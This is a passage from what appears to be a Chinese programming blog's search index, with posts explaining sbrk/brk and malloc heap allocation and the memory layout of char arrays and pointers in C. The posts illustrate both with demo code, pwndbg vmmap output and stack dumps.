./a</span><br><span class=\"line\">bss is 0x601048</span><br><span class=\"line\">start 0x1f9a000</span><br></pre></td></tr></table></figure>\n<p>不开启ASLR结果如下</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"> ~/Desktop/mydemo [<span class=\"number\">05</span>:<span class=\"number\">04</span>:<span class=\"number\">39</span>]</span><br><span class=\"line\">pz1o$ ./a</span><br><span class=\"line\">bss is <span class=\"number\">0x601048</span></span><br><span class=\"line\">start <span class=\"number\">0x623000</span></span><br><span class=\"line\"> ~/Desktop/mydemo [<span class=\"number\">05</span>:<span class=\"number\">04</span>:<span class=\"number\">40</span>]</span><br><span class=\"line\">pz1o$ ./a            </span><br><span class=\"line\">bss is <span class=\"number\">0x601048</span></span><br><span class=\"line\">start <span class=\"number\">0x623000</span></span><br><span class=\"line\"> ~/Desktop/mydemo [<span class=\"number\">05</span>:<span class=\"number\">04</span>:<span class=\"number\">43</span>]</span><br><span class=\"line\">pz1o$ ./a</span><br><span class=\"line\">bss is <span class=\"number\">0x601048</span></span><br><span class=\"line\">start <span class=\"number\">0x623000</span></span><br></pre></td></tr></table></figure>\n<p>可以看到在不开ASLR情况下，program break是不变的，当然另一种情况就是变化的</p>\n<p>此外srbk返回的是堆结束的地址具体可以看gdb调试</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">pwndbg&gt; vmmap</span><br><span class=\"line\">LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA</span><br><span class=\"line\">          <span class=\"number\">0x400000</span>           <span class=\"number\">0x401000</span> r-xp     <span class=\"number\">1000</span> <span class=\"number\">0</span>      /<span class=\"built_in\">home</span>/pz1o/Desktop/mydemo/a</span><br><span class=\"line\">          <span class=\"number\">0x600000</span>           <span class=\"number\">0x601000</span> r--p     <span class=\"number\">1000</span> <span class=\"number\">0</span>      /<span class=\"built_in\">home</span>/pz1o/Desktop/mydemo/a</span><br><span class=\"line\">          <span class=\"number\">0x601000</span>           <span class=\"number\">0x602000</span> rw-p     <span class=\"number\">1000</span> <span class=\"number\">1000</span>   /<span class=\"built_in\">home</span>/pz1o/Desktop/mydemo/a</span><br><span class=\"line\">          <span class=\"number\">0x602000</span>           <span class=\"number\">0x623000</span> rw-p    <span class=\"number\">21000</span> <span class=\"number\">0</span>      [heap]</span><br><span class=\"line\">    <span class=\"number\">0x7ffff7a0d000</span>     <span class=\"number\">0x7ffff7bcd000</span> r-xp   <span class=\"number\">1</span>c0000 <span class=\"number\">0</span>      /lib/x86_64-linux-gnu/libc<span class=\"number\">-2.23</span>.so</span><br><span class=\"line\">    <span class=\"number\">0x7ffff7bcd000</span>     <span class=\"number\">0x7ffff7dcd000</span> ---p   <span class=\"number\">200000</span> <span class=\"number\">1</span>c0000 /lib/x86_64-linux-gnu/libc<span class=\"number\">-2.23</span>.so</span><br><span class=\"line\">    <span class=\"number\">0x7ffff7dcd000</span>     <span class=\"number\">0x7ffff7dd1000</span> r--p     <span class=\"number\">4000</span> <span class=\"number\">1</span>c0000 /lib/x86_64-linux-gnu/libc<span class=\"number\">-2.23</span>.so</span><br><span class=\"line\">    <span class=\"number\">0x7ffff7dd1000</span>     <span class=\"number\">0x7ffff7dd3000</span> rw-p     <span class=\"number\">2000</span> <span class=\"number\">1</span>c4000 /lib/x86_64-linux-gnu/libc<span class=\"number\">-2.23</span>.so</span><br><span class=\"line\">    <span class=\"number\">0x7ffff7dd3000</span>     <span class=\"number\">0x7ffff7dd7000</span> rw-p     <span class=\"number\">4000</span> <span class=\"number\">0</span>      </span><br><span class=\"line\">    <span class=\"number\">0x7ffff7dd7000</span>     <span class=\"number\">0x7ffff7dfd000</span> r-xp    <span class=\"number\">26000</span> <span class=\"number\">0</span>      /lib/x86_64-linux-gnu/ld<span class=\"number\">-2.23</span>.so</span><br><span class=\"line\">    <span class=\"number\">0x7ffff7fd3000</span>     <span class=\"number\">0x7ffff7fd6000</span> rw-p     <span class=\"number\">3000</span> <span class=\"number\">0</span>      </span><br><span class=\"line\">    <span class=\"number\">0x7ffff7ff7000</span>     <span class=\"number\">0x7ffff7ffa000</span> r--p     <span class=\"number\">3000</span> <span class=\"number\">0</span>      [vvar]</span><br><span class=\"line\">    <span class=\"number\">0x7ffff7ffa000</span>     <span class=\"number\">0x7ffff7ffc000</span> r-xp     <span class=\"number\">2000</span> <span class=\"number\">0</span>      [vdso]</span><br><span class=\"line\">    <span class=\"number\">0x7ffff7ffc000</span>     <span class=\"number\">0x7ffff7ffd000</span> r--p     <span class=\"number\">1000</span> <span class=\"number\">25000</span>  /lib/x86_64-linux-gnu/ld<span class=\"number\">-2.23</span>.so</span><br><span class=\"line\">    <span class=\"number\">0x7ffff7ffd000</span>     <span class=\"number\">0x7ffff7ffe000</span> rw-p     <span class=\"number\">1000</span> <span class=\"number\">26000</span>  /lib/x86_64-linux-gnu/ld<span class=\"number\">-2.23</span>.so</span><br><span class=\"line\">    <span class=\"number\">0x7ffff7ffe000</span>     <span class=\"number\">0x7ffff7fff000</span> rw-p     <span class=\"number\">1000</span> <span class=\"number\">0</span>      </span><br><span class=\"line\">    <span class=\"number\">0x7ffffffde000</span>     <span class=\"number\">0x7ffffffff000</span> rw-p    <span class=\"number\">21000</span> <span class=\"number\">0</span>      [<span class=\"built_in\">stack</span>]</span><br><span class=\"line\"><span class=\"number\">0xffffffffff600000</span> <span class=\"number\">0xffffffffff601000</span> r-xp     <span class=\"number\">1000</span> <span class=\"number\">0</span>      [vsyscall]</span><br></pre></td></tr></table></figure>\n<p>接下来不是0的</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span><span class=\"meta-string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span><span class=\"meta-string\">&lt;unistd.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span><span class=\"meta-string\">&lt;stdlib.h&gt;</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">int</span> bss_end;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">main</span><span class=\"params\">(<span class=\"keyword\">void</span>)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">void</span>* ret;</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">\"bss is %p\\n\"</span>,(<span class=\"keyword\">char</span>*)(&amp;bss_end)+<span class=\"number\">4</span>);</span><br><span class=\"line\">\tret = sbrk(<span class=\"number\">0x1000</span>);</span><br><span class=\"line\">\t<span class=\"keyword\">if</span>(ret != (<span class=\"keyword\">void</span>*)<span class=\"number\">-1</span>)&#123;</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">\"start %p\\n\"</span>,ret);</span><br><span class=\"line\"></span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"keyword\">int</span>* a = <span class=\"built_in\">malloc</span>(<span class=\"number\">0x100</span>);</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">\"malloc is %p\"</span>,a);</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>直接看结果</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">pwndbg&gt; vmmap</span><br><span class=\"line\">LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA</span><br><span class=\"line\">          <span class=\"number\">0x400000</span>           <span class=\"number\">0x401000</span> r-xp     <span class=\"number\">1000</span> <span class=\"number\">0</span>      /<span class=\"built_in\">home</span>/pz1o/Desktop/mydemo/a</span><br><span class=\"line\">          <span class=\"number\">0x600000</span>           <span class=\"number\">0x601000</span> r--p     <span class=\"number\">1000</span> <span class=\"number\">0</span>      /<span class=\"built_in\">home</span>/pz1o/Desktop/mydemo/a</span><br><span class=\"line\">          <span class=\"number\">0x601000</span>           <span class=\"number\">0x602000</span> rw-p     <span class=\"number\">1000</span> <span class=\"number\">1000</span>   /<span class=\"built_in\">home</span>/pz1o/Desktop/mydemo/a</span><br><span class=\"line\">          <span class=\"number\">0x602000</span>           <span class=\"number\">0x624000</span> rw-p    <span class=\"number\">22000</span> <span class=\"number\">0</span>      [heap]</span><br><span class=\"line\">    <span class=\"number\">0x7ffff7a0d000</span>     <span class=\"number\">0x7ffff7bcd000</span> r-xp   <span class=\"number\">1</span>c0000 <span class=\"number\">0</span>      /lib/x86_64-linux-gnu/libc<span class=\"number\">-2.23</span>.so</span><br><span class=\"line\">    <span class=\"number\">0x7ffff7bcd000</span>     <span class=\"number\">0x7ffff7dcd000</span> ---p   <span class=\"number\">200000</span> <span class=\"number\">1</span>c0000 /lib/x86_64-linux-gnu/libc<span class=\"number\">-2.23</span>.so</span><br><span class=\"line\">    <span class=\"number\">0x7ffff7dcd000</span>     <span class=\"number\">0x7ffff7dd1000</span> r--p     <span class=\"number\">4000</span> <span class=\"number\">1</span>c0000 /lib/x86_64-linux-gnu/libc<span class=\"number\">-2.23</span>.so</span><br><span class=\"line\">    <span class=\"number\">0x7ffff7dd1000</span>     <span class=\"number\">0x7ffff7dd3000</span> rw-p     <span class=\"number\">2000</span> <span class=\"number\">1</span>c4000 /lib/x86_64-linux-gnu/libc<span class=\"number\">-2.23</span>.so</span><br><span class=\"line\">    <span class=\"number\">0x7ffff7dd3000</span>     <span class=\"number\">0x7ffff7dd7000</span> rw-p     <span class=\"number\">4000</span> <span class=\"number\">0</span>      </span><br><span class=\"line\">    <span class=\"number\">0x7ffff7dd7000</span>     <span class=\"number\">0x7ffff7dfd000</span> r-xp    <span class=\"number\">26000</span> <span class=\"number\">0</span>      /lib/x86_64-linux-gnu/ld<span class=\"number\">-2.23</span>.so</span><br><span class=\"line\">    <span class=\"number\">0x7ffff7fd3000</span>     <span class=\"number\">0x7ffff7fd6000</span> rw-p     <span class=\"number\">3000</span> <span class=\"number\">0</span>      </span><br><span class=\"line\">    <span class=\"number\">0x7ffff7ff7000</span>     <span class=\"number\">0x7ffff7ffa000</span> r--p     <span class=\"number\">3000</span> <span class=\"number\">0</span>      [vvar]</span><br><span class=\"line\">    <span class=\"number\">0x7ffff7ffa000</span>     <span class=\"number\">0x7ffff7ffc000</span> r-xp     <span class=\"number\">2000</span> <span class=\"number\">0</span>      [vdso]</span><br><span class=\"line\">    <span class=\"number\">0x7ffff7ffc000</span>     <span class=\"number\">0x7ffff7ffd000</span> r--p     <span class=\"number\">1000</span> <span class=\"number\">25000</span>  /lib/x86_64-linux-gnu/ld<span class=\"number\">-2.23</span>.so</span><br><span class=\"line\">    <span class=\"number\">0x7ffff7ffd000</span>     <span class=\"number\">0x7ffff7ffe000</span> rw-p     <span class=\"number\">1000</span> <span class=\"number\">26000</span>  /lib/x86_64-linux-gnu/ld<span class=\"number\">-2.23</span>.so</span><br><span class=\"line\">    <span class=\"number\">0x7ffff7ffe000</span>     <span class=\"number\">0x7ffff7fff000</span> rw-p     <span class=\"number\">1000</span> <span class=\"number\">0</span>      </span><br><span class=\"line\">    <span class=\"number\">0x7ffffffde000</span>     <span class=\"number\">0x7ffffffff000</span> rw-p    <span class=\"number\">21000</span> <span class=\"number\">0</span>      [<span class=\"built_in\">stack</span>]</span><br><span class=\"line\"><span class=\"number\">0xffffffffff600000</span> <span class=\"number\">0xffffffffff601000</span> r-xp     <span class=\"number\">1000</span> <span class=\"number\">0</span>      [vsyscall]</span><br><span class=\"line\"></span><br><span class=\"line\">bss is <span class=\"number\">0x601050</span></span><br><span class=\"line\">start <span class=\"number\">0x623000</span></span><br></pre></td></tr></table></figure>\n<h1 id=\"0x03-堆管理\"><a href=\"#0x03-堆管理\" class=\"headerlink\" title=\"0x03 堆管理\"></a>0x03 堆管理</h1><p>1）当开辟的空间小于 128K 时，调用 brk（）函数，malloc 的底层实现是系统调用函数 brk（），其主要移动指针program break</p>\n<p>2）当开辟的空间大于 128K 时，mmap（）系统调用函数来在虚拟地址空间中（堆和栈中间，称为“文件映射区域”的地方）找一块空间来开辟。</p>\n<h2 id=\"1-malloc小于128k\"><a href=\"#1-malloc小于128k\" class=\"headerlink\" title=\"1. malloc小于128k\"></a>1. malloc小于128k</h2><p>这时只使用brk分配</p>\n<p><img src=\"/2021/04/17/%E7%90%86%E8%A7%A3sbrk%E5%92%8Cbrk/image-20210418233030728.png\" alt=\"image-20210418233030728\"></p>\n<ol>\n<li>进程启动的时候，其（虚拟）内存空间的初始布局如图所示</li>\n<li>进程调用A=malloc(30K)以后，内存空间如图malloc函数会调用brk系统调用，将program break指针往高地址推30K，就完成虚拟内存分配</li>\n</ol>\n<p>这只是完成虚拟地址的分配，A这块内存现在还是没有物理页与之对应的，等到进程第一次读写A这块内存的时候，发生缺页中断，这个时候，内核才分配A这块内存对应的物理页。<strong>也就是说，如果用malloc分配了A这块内容，然后从来不访问它，那么，A对应的物理页是不会被分配的。</strong></p>\n<h2 id=\"2-malloc大于128k\"><a href=\"#2-malloc大于128k\" class=\"headerlink\" title=\"2. malloc大于128k\"></a>2. malloc大于128k</h2><p>这时使用mmap分配</p>\n<p><img src=\"/2021/04/17/%E7%90%86%E8%A7%A3sbrk%E5%92%8Cbrk/image-20210418233136531.png\" alt=\"image-20210418233136531\"></p>\n<ol>\n<li>进程分配C=malloc(200K),<strong>malloc函数分配内存，如果请求内存大于128K利用mmap系统调用，从堆和栈的中间分配一块虚拟内存</strong>，原因在于<strong>brk分配的内存需要等到高地址内存释放以后才能释放而mmap分配的内存可以单独释放。</strong></li>\n</ol>\n","categories":[],"tags":["c"]},{"title":"char类型","url":"https://pz1o.top/2021/04/13/char类型/","content":"<p>我是fw</p>\n<p>char[],char*,char的区别</p>\n<h1 id=\"0x01-代码编译\"><a href=\"#0x01-代码编译\" class=\"headerlink\" title=\"0x01 代码编译\"></a>0x01 代码编译</h1><p><code>gcc version 5.4.0 20160609 (Ubuntu 5.4.0-6ubuntu1~16.04.12)</code></p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span><span class=\"meta-string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span><span class=\"meta-string\">&lt;string.h&gt;</span></span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">main</span><span class=\"params\">()</span></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">char</span> a[<span class=\"number\">10</span>]=&#123;<span class=\"string\">'a'</span>,<span class=\"string\">'a'</span>,<span class=\"string\">'a'</span>,<span class=\"string\">'a'</span>,<span class=\"string\">'a'</span>,<span class=\"string\">'a'</span>,<span class=\"string\">'a'</span>&#125;;</span><br><span class=\"line\">    <span class=\"keyword\">char</span> m[]=&#123;<span class=\"string\">'a'</span>,<span class=\"string\">\"b\"</span>,<span class=\"string\">'c'</span>,<span class=\"string\">'d'</span>&#125;;</span><br><span class=\"line\">    <span class=\"keyword\">char</span> n[]=&#123;<span class=\"string\">'m'</span>,<span class=\"string\">\"nnnn\"</span>,<span class=\"string\">'o'</span>,<span class=\"string\">'d'</span>,<span class=\"string\">'p'</span>,<span class=\"string\">\"q\"</span>&#125;;</span><br><span class=\"line\">    <span class=\"keyword\">char</span>* b=<span class=\"string\">\"bbbbbbb\"</span>;</span><br><span class=\"line\">    <span class=\"keyword\">char</span> c[<span class=\"number\">10</span>]=<span class=\"string\">\"ccccccc\"</span>;</span><br><span class=\"line\">    <span class=\"keyword\">char</span>* d[<span class=\"number\">10</span>]=&#123;<span class=\"string\">'a'</span>,<span class=\"string\">'b'</span>,<span class=\"string\">'c'</span>,<span class=\"string\">'d'</span>,<span class=\"string\">'e'</span>,<span class=\"string\">'f'</span>,<span class=\"string\">'g'</span>&#125;;</span><br><span class=\"line\">    <span class=\"keyword\">char</span>* e[<span class=\"number\">10</span>]=&#123;<span class=\"string\">\"a\"</span>,<span class=\"string\">\"b\"</span>,<span class=\"string\">\"c\"</span>,<span class=\"string\">\"d\"</span>,<span class=\"string\">\"e\"</span>,<span class=\"string\">\"f\"</span>,<span class=\"string\">\"g\"</span>&#125;;</span><br><span class=\"line\">    <span class=\"keyword\">const</span> <span class=\"keyword\">char</span> f[<span class=\"number\">10</span>]=&#123;<span class=\"string\">\"fffffff\"</span>&#125;;</span><br><span class=\"line\">    <span class=\"keyword\">const</span> <span class=\"keyword\">char</span>* g=<span class=\"string\">\"ggggggg\"</span>;</span><br><span class=\"line\">    <span class=\"keyword\">char</span>* <span class=\"keyword\">const</span> h=<span class=\"string\">\"hhhhhhh\"</span>;</span><br><span class=\"line\">    <span class=\"keyword\">const</span> <span class=\"keyword\">char</span>* <span class=\"keyword\">const</span> i = <span class=\"string\">\"iiiiiii\"</span>;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h1 id=\"0x02-代码调试\"><a href=\"#0x02-代码调试\" class=\"headerlink\" title=\"0x02 代码调试\"></a>0x02 代码调试</h1><p>直接下到最后的断点</p>\n<p>当前的变量</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">pwndbg&gt; info local</span><br><span class=\"line\">a = <span class=\"string\">\"aaaaaaa\\000\\000\"</span></span><br><span class=\"line\">m = <span class=\"string\">\"a\\204cd\"</span></span><br><span class=\"line\">n = <span class=\"string\">\"m\\206odp\\213\"</span></span><br><span class=\"line\">b = <span class=\"number\">0x40078d</span> <span class=\"string\">\"bbbbbbb\"</span></span><br><span class=\"line\">c = <span class=\"string\">\"ccccccc\\000\\000\"</span></span><br><span class=\"line\">d = &#123;<span class=\"number\">0x61</span> &lt;error: Cannot access memory at address <span class=\"number\">0x61</span>&gt;, <span class=\"number\">0x62</span> &lt;error: Cannot access memory at address <span class=\"number\">0x62</span>&gt;, <span class=\"number\">0x63</span> &lt;error: Cannot access memory at address <span class=\"number\">0x63</span>&gt;, <span class=\"number\">0x64</span> &lt;error: Cannot access memory at address <span class=\"number\">0x64</span>&gt;, <span class=\"number\">0x65</span> &lt;error: Cannot access memory at address <span class=\"number\">0x65</span>&gt;, <span class=\"number\">0x66</span> &lt;error: Cannot access memory at address <span class=\"number\">0x66</span>&gt;, <span class=\"number\">0x67</span> &lt;error: Cannot access memory at address <span class=\"number\">0x67</span>&gt;, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>&#125;</span><br><span class=\"line\">e = &#123;<span class=\"number\">0x400795</span> <span class=\"string\">\"a\"</span>, <span class=\"number\">0x400784</span> <span class=\"string\">\"b\"</span>, <span class=\"number\">0x400797</span> <span class=\"string\">\"c\"</span>, <span class=\"number\">0x400799</span> <span class=\"string\">\"d\"</span>, <span class=\"number\">0x40079b</span> <span class=\"string\">\"e\"</span>, <span class=\"number\">0x40079d</span> <span class=\"string\">\"f\"</span>, <span class=\"number\">0x40079f</span> <span class=\"string\">\"g\"</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>&#125;</span><br><span class=\"line\">f = <span class=\"string\">\"fffffff\\000\\000\"</span></span><br><span class=\"line\">g = <span class=\"number\">0x4007a1</span> <span class=\"string\">\"ggggggg\"</span></span><br><span class=\"line\">h = <span class=\"number\">0x4007a9</span> <span class=\"string\">\"hhhhhhh\"</span></span><br><span class=\"line\">i = <span class=\"number\">0x4007b1</span> <span class=\"string\">\"iiiiiii\"</span></span><br><span class=\"line\">pwndbg&gt; x/<span class=\"number\">40</span>gx <span class=\"number\">0x7fffffffdb80</span></span><br><span class=\"line\"><span class=\"number\">0x7fffffffdb80</span>:\t<span class=\"number\">0x000000000040078d</span>\t<span class=\"number\">0x00000000004007a1</span></span><br><span class=\"line\">    \t\t\t<span class=\"keyword\">char</span>* b\t\t\t\t<span class=\"keyword\">const</span> <span class=\"keyword\">char</span>* g</span><br><span class=\"line\"><span class=\"number\">0x7fffffffdb90</span>:\t<span class=\"number\">0x00000000004007a9</span>\t<span class=\"number\">0x00000000004007b1</span></span><br><span class=\"line\">    \t\t\t<span class=\"keyword\">char</span>* <span class=\"keyword\">const</span> h\t\t<span class=\"keyword\">const</span> <span class=\"keyword\">char</span>* <span class=\"keyword\">const</span> i</span><br><span class=\"line\"><span class=\"number\">0x7fffffffdba0</span>:\t<span class=\"number\">0x0000000000000061</span>\t<span class=\"number\">0x0000000000000062</span></span><br><span class=\"line\">    \t\t\t<span class=\"keyword\">char</span>* d[<span class=\"number\">0</span>]\t\t\t...</span><br><span class=\"line\"><span class=\"number\">0x7fffffffdbb0</span>:\t<span class=\"number\">0x0000000000000063</span>\t<span class=\"number\">0x0000000000000064</span></span><br><span class=\"line\"><span class=\"number\">0x7fffffffdbc0</span>:\t<span class=\"number\">0x0000000000000065</span>\t<span class=\"number\">0x0000000000000066</span></span><br><span class=\"line\"><span class=\"number\">0x7fffffffdbd0</span>:\t<span class=\"number\">0x0000000000000067</span>\t<span class=\"number\">0x0000000000000000</span></span><br><span class=\"line\"><span class=\"number\">0x7fffffffdbe0</span>:\t<span class=\"number\">0x0000000000000000</span>\t<span class=\"number\">0x0000000000000000</span></span><br><span class=\"line\">    \t\t\t<span class=\"keyword\">char</span>* d[<span class=\"number\">8</span>]\t\t\t<span class=\"keyword\">char</span>* d[<span class=\"number\">9</span>]\t</span><br><span class=\"line\"><span class=\"number\">0x7fffffffdbf0</span>:\t<span class=\"number\">0x0000000000400795</span>\t<span class=\"number\">0x0000000000400784</span></span><br><span class=\"line\">    \t\t\t<span class=\"keyword\">char</span>* e[<span class=\"number\">0</span>]\t\t\t...</span><br><span class=\"line\"><span class=\"number\">0x7fffffffdc00</span>:\t<span class=\"number\">0x0000000000400797</span>\t<span class=\"number\">0x0000000000400799</span></span><br><span class=\"line\"><span class=\"number\">0x7fffffffdc10</span>:\t<span class=\"number\">0x000000000040079b</span>\t<span class=\"number\">0x000000000040079d</span></span><br><span class=\"line\"><span class=\"number\">0x7fffffffdc20</span>:\t<span class=\"number\">0x000000000040079f</span>\t<span class=\"number\">0x0000000000000000</span></span><br><span class=\"line\"><span class=\"number\">0x7fffffffdc30</span>:\t<span class=\"number\">0x0000000000000000</span>\t<span class=\"number\">0x0000000000000000</span></span><br><span class=\"line\">    \t\t\t<span class=\"keyword\">char</span>* e[<span class=\"number\">8</span>]\t\t\t<span class=\"keyword\">char</span>* e[<span class=\"number\">9</span>]\t\t\t</span><br><span class=\"line\"><span class=\"number\">0x7fffffffdc40</span>:\t<span class=\"number\">0x0000000064638461</span>\t<span class=\"number\">0x00007fffffffdcc0</span></span><br><span class=\"line\">    \t\t\t<span class=\"keyword\">char</span> m[]</span><br><span class=\"line\"><span class=\"number\">0x7fffffffdc50</span>:\t<span class=\"number\">0x00008b70646f866d</span>\t<span class=\"number\">0x0000000000f0b5ff</span></span><br><span class=\"line\">    \t\t\t<span class=\"keyword\">char</span> n[]</span><br><span class=\"line\"><span class=\"number\">0x7fffffffdc60</span>:\t<span class=\"number\">0x0061616161616161</span>\t<span class=\"number\">0x0000000000400000</span></span><br><span class=\"line\">    \t\t\t<span class=\"keyword\">char</span> a[<span class=\"number\">10</span>]</span><br><span class=\"line\"><span class=\"number\">0x7fffffffdc70</span>:\t<span class=\"number\">0x0063636363636363</span>\t<span class=\"number\">0x0000000000000000</span></span><br><span class=\"line\">    \t\t\t<span class=\"keyword\">char</span> c[<span class=\"number\">10</span>]</span><br><span class=\"line\"><span class=\"number\">0x7fffffffdc80</span>:\t<span class=\"number\">0x0066666666666666</span>\t<span class=\"number\">0x0000000000400000</span></span><br><span class=\"line\">    \t\t\t<span class=\"keyword\">const</span> <span class=\"keyword\">char</span> f[<span class=\"number\">10</span>]</span><br><span class=\"line\"><span class=\"number\">0x7fffffffdc90</span>:\t<span class=\"number\">0x00007fffffffdd80</span>\t<span class=\"number\">0x60ff615f4dd88b00</span></span><br><span class=\"line\"><span class=\"number\">0x7fffffffdca0</span>:\t<span class=\"number\">0x0000000000400700</span>\t<span class=\"number\">0x00007ffff7a2d840</span></span><br><span class=\"line\"><span class=\"number\">0x7fffffffdcb0</span>:\t<span class=\"number\">0x0000000000000001</span>\t<span class=\"number\">0x00007fffffffdd88</span></span><br></pre></td></tr></table></figure>\n<h1 id=\"0x03-IDA分析\"><a href=\"#0x03-IDA分析\" class=\"headerlink\" title=\"0x03 IDA分析\"></a>0x03 IDA分析</h1><p>拿IDA来看一下</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span 